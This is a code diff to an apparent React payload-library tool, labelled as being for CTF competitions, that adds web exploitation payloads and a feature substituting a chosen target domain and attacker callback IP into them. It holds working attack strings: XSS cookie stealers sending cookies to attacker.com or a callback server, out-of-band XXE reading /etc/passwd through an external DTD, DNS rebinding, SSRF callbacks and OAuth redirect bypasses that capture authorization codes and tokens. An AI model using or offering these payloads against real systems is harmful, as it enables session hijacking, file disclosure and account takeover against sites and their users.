@@ -59,6 +59,11 @@ const WebTools: React.FC = () => {
   const [favorites, setFavorites] = useState<string[]>([])
   const [showFavoritesOnly, setShowFavoritesOnly] = useState(false)
 
+  // Target Domain/URL for payload substitution
+  const [targetDomain, setTargetDomain] = useState('')
+  const [targetIP, setTargetIP] = useState('')
+  const [attackerIP, setAttackerIP] = useState('')
+
   // Interactive Testing Tools State
   const [testInput, setTestInput] = useState('')
   const [testOutput, setTestOutput] = useState('')
@@ -249,9 +254,16 @@ const WebTools: React.FC = () => {
     {
       name: "Cookie Stealer",
       category: "Cookie Theft",
-      payload: "<script>document.location='http://attacker.com/cookie.php?c='+document.cookie</script>",
+      payload: "<script>document.location='{CALLBACK_URL}/cookie.php?c='+document.cookie</script>",
       description: "Redirect to attacker server with stolen cookies",
-      usage: "Replace attacker.com with your server for CTF challenges"
+      usage: "Uses your callback IP for cookie exfiltration"
+    },
+    {
+      name: "Fetch Exfiltration",
+      category: "Cookie Theft",
+      payload: "<script>fetch('{CALLBACK_URL}?data='+btoa(document.cookie))</script>",
+      description: "Modern fetch-based data exfiltration",
+      usage: "Base64 encodes cookie and sends to your callback server"
     },
     {
       name: "DOM XSS",
@@ -804,9 +816,16 @@ const WebTools: React.FC = () => {
     {
       name: "Blind XXE",
       category: "Blind XXE",
-      payload: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><foo></foo>",
+      payload: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"{CALLBACK_URL}/evil.dtd\"> %xxe;]><foo></foo>",
       description: "Blind XXE with external DTD",
-      usage: "Use when no direct output is visible"
+      usage: "Use when no direct output is visible - exfiltrates data to your callback server"
+    },
+    {
+      name: "OOB XXE Data Exfiltration",
+      category: "Blind XXE",
+      payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"><!ENTITY % dtd SYSTEM \"{CALLBACK_URL}/xxe.dtd\">%dtd;]><foo>&send;</foo>",
+      description: "Out-of-band XXE with base64 data exfiltration",
+      usage: "Requires evil.dtd on your callback server"
     },
     {
       name: "XXE via SVG",
@@ -994,9 +1013,16 @@ const WebTools: React.FC = () => {
     {
       name: "DNS Rebinding",
       category: "DNS Rebinding",
-      payload: "http://7f000001.attacker.com/",
+      payload: "http://7f000001.{ATTACKER_IP}/",
       description: "DNS rebinding attack to bypass filters",
       usage: "Domain resolves to 127.0.0.1 after initial request"
+    },
+    {
+      name: "Callback Verification",
+      category: "OOB Detection",
+      payload: "http://{ATTACKER_IP}:{8000}/ssrf_verify",
+      description: "Out-of-band SSRF detection via callback",
+      usage: "Verify SSRF by checking your callback server logs"
     },
     {
       name: "IPv6 Localhost",
@@ -1623,16 +1649,23 @@ const WebTools: React.FC = () => {
     {
       name: "OAuth Redirect URI Bypass",
       category: "OAuth",
-      payload: "https://vulnerable-app.com/callback/../oauth?redirect_uri=https://attacker.com",
+      payload: "https://{DOMAIN}/callback/../oauth?redirect_uri={CALLBACK_URL}",
       description: "Bypass redirect_uri validation using path traversal",
-      usage: "Steal authorization codes by manipulating redirect"
+      usage: "Steal authorization codes by manipulating redirect to your callback"
     },
     {
       name: "OAuth State CSRF",
       category: "OAuth",
-      payload: "https://oauth-provider.com/authorize?client_id=CLIENT_ID&redirect_uri=https://client.com/callback&response_type=code",
+      payload: "https://{DOMAIN}/authorize?client_id=CLIENT_ID&redirect_uri={CALLBACK_URL}&response_type=code",
       description: "Missing state parameter allows CSRF during OAuth flow",
       usage: "Force victim to authenticate with attacker's account"
+    },
+    {
+      name: "OAuth Open Redirect",
+      category: "OAuth",
+      payload: "https://{DOMAIN}/oauth/authorize?redirect_uri={CALLBACK_URL}/steal_token",
+      description: "Exploit open redirect in OAuth flow",
+      usage: "Capture OAuth tokens via redirect to your server"
     },
     {
       name: "SAML Assertion Injection",
@@ -2065,6 +2098,9 @@ const WebTools: React.FC = () => {
 
   const renderPayloadCard = (payload: Payload) => {
     const payloadKey = `${payload.category}-${payload.name}`
+    const substitutedPayload = substitutePayload(payload.payload)
+    const hasSubstitution = substitutedPayload !== payload.payload
+
     return (
       <Card key={payloadKey} className="p-4 space-y-3">
         <div className="flex items-center justify-between">
@@ -2083,15 +2119,21 @@ const WebTools: React.FC = () => {
         </div>
         <p className="text-sm text-muted-foreground">{payload.description}</p>
         <div className="space-y-2">
-          <div className="bg-background rounded p-2 font-mono text-sm break-all">
-            {payload.payload}
+          <div className={`bg-background rounded p-2 font-mono text-sm break-all ${hasSubstitution ? 'border-2 border-accent/30' : ''}`}>
+            {substitutedPayload}
           </div>
+          {hasSubstitution && (
+            <div className="text-xs text-accent flex items-center gap-1">
+              <Zap className="w-3 h-3" />
+              <span>Payload customized with your targets</span>
+            </div>
+          )}
           <div className="flex items-center justify-between">
             <span className="text-xs text-muted-foreground">{payload.usage}</span>
             <Button
               size="sm"
               variant="outline"
-              onClick={() => copyToClipboard(payload.payload, payload.name)}
+              onClick={() => copyToClipboard(substitutedPayload, payload.name)}
               className="h-6"
             >
               <Copy className="h-3 w-3" />
@@ -2150,6 +2192,33 @@ const WebTools: React.FC = () => {
     return ['all', ...categories]
   }
 
+  // Substitute placeholders in payloads with actual target values
+  const substitutePayload = (payload: string): string => {
+    let result = payload
+
+    // Replace {DOMAIN} with target domain
+    if (targetDomain) {
+      result = result.replace(/{DOMAIN}/g, targetDomain)
+      result = result.replace(/{URL}/g, `https://${targetDomain}`)
+      result = result.replace(/{HTTP_URL}/g, `http://${targetDomain}`)
+    }
+
+    // Replace {TARGET_IP} with target IP
+    if (targetIP) {
+      result = result.replace(/{TARGET_IP}/g, targetIP)
+      result = result.replace(/{IP}/g, targetIP)
+    }
+
+    // Replace {ATTACKER_IP} with attacker IP
+    if (attackerIP) {
+      result = result.replace(/{ATTACKER_IP}/g, attackerIP)
+      result = result.replace(/{CALLBACK}/g, `http://${attackerIP}`)
+      result = result.replace(/{CALLBACK_URL}/g, `http://${attackerIP}`)
+    }
+
+    return result
+  }
+
   return (
     <div className="p-6 space-y-6">
       {/* Header */}
@@ -2162,6 +2231,40 @@ const WebTools: React.FC = () => {
           Collection of web exploitation payloads and techniques for CTF competitions
         </p>
       </div>
+
+      {/* Target Configuration */}
+      <Card className="p-4 bg-accent/5 border-accent/20">
+        <div className="space-y-3">
+          <div className="flex items-center gap-2 mb-2">
+            <Server className="w-4 h-4 text-accent" />
+            <h3 className="font-semibold text-sm">Target Configuration</h3>
+            <span className="text-xs text-muted-foreground">(Auto-replaces {'{DOMAIN}'}, {'{IP}'}, {'{ATTACKER_IP}'} in payloads)</span>
+          </div>
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
+            <Input
+              type="text"
+              placeholder="Target Domain (e.g., example.com)"
+              value={targetDomain}
+              onChange={(e) => setTargetDomain(e.target.value)}
+              className="text-sm"
+            />
+            <Input
+              type="text"
+              placeholder="Target IP (e.g., 192.168.1.1)"
+              value={targetIP}
+              onChange={(e) => setTargetIP(e.target.value)}
+              className="text-sm"
+            />
+            <Input
+              type="text"
+              placeholder="Your Callback IP (e.g., 10.0.0.1)"
+              value={attackerIP}
+              onChange={(e) => setAttackerIP(e.target.value)}
+              className="text-sm"
+            />
+          </div>
+        </div>
+      </Card>
 
       {/* Search and Filter Controls */}
       <Card className="p-4">
